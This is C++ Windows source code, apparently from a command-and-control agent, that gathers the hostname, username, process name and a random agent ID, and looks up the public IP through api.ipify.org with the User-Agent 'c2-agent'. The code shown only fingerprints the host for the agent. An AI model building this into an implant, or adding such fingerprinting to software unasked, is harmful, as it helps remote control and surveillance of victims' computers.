#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <psapi.h>
#include <cstdlib>
#include <ctime>
#include <string>
#include <sstream>
#include <iomanip>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#define UNLEN 127

using namespace std;

std::string get_hostname() {
    char hostname[MAX_PATH] = { 0 };
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size))
        return hostname;
    return "unknown_host";
}

std::string get_username() {
    char username[UNLEN + 1] = { 0 };
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size))
        return username;
    return "unknown_user";
}

std::string get_process_name() {
    char proc_name[MAX_PATH] = { 0 };
    if (GetModuleFileNameA(NULL, proc_name, MAX_PATH)) {
        std::string s(proc_name);
        size_t pos = s.find_last_of("\\/");
        if (pos != string::npos) return s.substr(pos + 1);
        return s;
    }
    return "unknown_process";
}

std::string generate_agent_id() {
    static std::string agent_id;
    if (agent_id.empty()) {
        static bool seeded = false;
        if (!seeded) {
            std::srand(static_cast<unsigned int>(std::time(nullptr)));
            seeded = true;
        }
        int num = 10000000 + std::rand() % 90000000;
        std::ostringstream oss;
        oss << std::setw(8) << std::setfill('0') << num;
        agent_id = oss.str();
    }
    return agent_id;
}

std::string getPublicIP() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return "Unknown";
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return "Unknown";
    }

    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo("api.ipify.org", "80", &hints, &result) != 0) {
        closesocket(sock);
        WSACleanup();
        return "Unknown";
    }

    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        freeaddrinfo(result);
        closesocket(sock);
        WSACleanup();
        return "Unknown";
    }
    freeaddrinfo(result);

    const char* request =
        "GET / HTTP/1.1\r\n"
        "Host: api.ipify.org\r\n"
        "Connection: close\r\n"
        "User-Agent: c2-agent\r\n"
        "\r\n";

    if (send(sock, request, strlen(request), 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return "Unknown";
    }

    char buffer[4096] = {0};
    std::string response;
    int bytesReceived;

    while ((bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        response += buffer;
    }

    closesocket(sock);
    WSACleanup();

    if (response.empty()) {
        return "Unknown";
    }

    size_t headerEnd = response.find("\r\n\r\n");
    if (headerEnd == std::string::npos) {
        return "Unknown";
    }

    std::string ipAddress = response.substr(headerEnd + 4);
    ipAddress.erase(ipAddress.find_last_not_of(" \n\r\t") + 1);

    if (ipAddress.empty()) {
        return "Unknown";
    }

    return ipAddress;
}
